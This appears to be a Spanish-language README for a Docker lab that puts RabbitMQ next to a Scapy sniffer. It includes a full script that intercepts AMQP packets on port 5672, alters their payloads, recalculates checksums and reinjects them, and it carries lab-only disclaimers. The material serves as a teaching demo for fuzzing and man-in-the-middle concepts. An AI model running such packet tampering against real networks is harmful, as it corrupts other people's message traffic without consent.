# 🧃🐇 AMQP Packet Chaos con Scapy (SOLO FINES EDUCATIVOS)

🚨 **Disclaimer:**  
Este proyecto es **SOLO** con fines educativos para entender cómo interceptar/modificar/inyectar tráfico AMQP usando **Scapy**. NO lo uses en redes ajenas. Sé decente: solo en entorno de laboratorio.

## 📂 Estructura
.
├── docker-compose.yml
├── el_enviador/
│   ├── Dockerfile
│   ├── Insaneador.py
├── el_espameado/
│   ├── Dockerfile
│   ├── Insaneado.py
├── el_sniffer/
│   ├── Dockerfile
│   ├── modificador.py

## 🚀 Qué hace
- Levanta RabbitMQ con interfaz de gestión.
- `el_enviador` envía mensajes AMQP.
- `el_espameado` los recibe.
- `el_sniffer` intercepta paquetes AMQP (**puerto 5672**) con **Scapy**.
- Modifica payload (fuzzing básico).
- Reinyecta los paquetes alterados para ver si RabbitMQ explota o filtra.

## 🧃 modificador.py
from scapy.all import *

print("🧃 Sniffer MITM activo...")

def packet_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 5672:
        print(f"📦 Original: {packet.summary()}")
        if Raw in packet:
            original = packet[Raw].load
            modified = b"HACKED_" + original
            packet[Raw].load = modified
            del packet[IP].chksum
            del packet[TCP].chksum
            send(packet)
            print(f"🚨 Modificado y reinyectado: {packet.summary()}")

sniff(filter="tcp port 5672", prn=packet_callback, store=0)

## 🧃 Dockerfile el_sniffer
FROM python:3.11-slim

RUN apt-get update && apt-get install -y tcpdump iproute2 iputils-ping && pip install scapy

WORKDIR /app
COPY modificador.py .
CMD ["python", "modificador.py"]

## 🧃 Disclaimer final
**SOLO LABORATORIO. SOLO PRUEBAS. NO A LAS ILEGALIDADES EXPLOSIVAS.**  
No hackees a la tía que vende empanadas. 🫠🐇💥
